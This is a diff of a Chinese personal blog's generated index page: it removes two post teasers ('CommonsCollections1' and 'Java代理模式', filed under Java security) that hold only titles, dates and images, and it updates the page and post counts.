-    <link itemprop="mainEntityOfPage" href="http://www.zcwww.top/2023/08/31/CommonsCollections1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/head.jpg">
-      <meta itemprop="name" content="B3c0me">
-      <meta itemprop="description" content="去爱 去工作">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="THIS IS B3c0me">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/08/31/CommonsCollections1/" class="post-title-link" itemprop="url">CommonsCollections1</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-08-31 19:07:28" itemprop="dateCreated datePublished" datetime="2023-08-31T19:07:28+08:00">2023-08-31</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-09-03 10:21:26" itemprop="dateModified" datetime="2023-09-03T10:21:26+08:00">2023-09-03</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><img src="/2023/08/31/CommonsCollections1/u=1649713328,2751143510&fm=253&fmt=auto&app=138&f=JPEG.jpeg"></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/08/31/CommonsCollections1/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.zcwww.top/2023/08/30/Java%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/head.jpg">
-      <meta itemprop="name" content="B3c0me">
-      <meta itemprop="description" content="去爱 去工作">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="THIS IS B3c0me">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/08/30/Java%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/" class="post-title-link" itemprop="url">Java代理模式</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-08-30 13:40:14" itemprop="dateCreated datePublished" datetime="2023-08-30T13:40:14+08:00">2023-08-30</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-09-03 17:14:12" itemprop="dateModified" datetime="2023-09-03T17:14:12+08:00">2023-09-03</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><img src="/2023/08/30/Java%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/u=3912894700,3164279736&fm=253&fmt=auto&app=138&f=PNG.png"></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/08/30/Java%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -902,7 +1138,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">72</span>
+          <span class="site-state-item-count">74</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
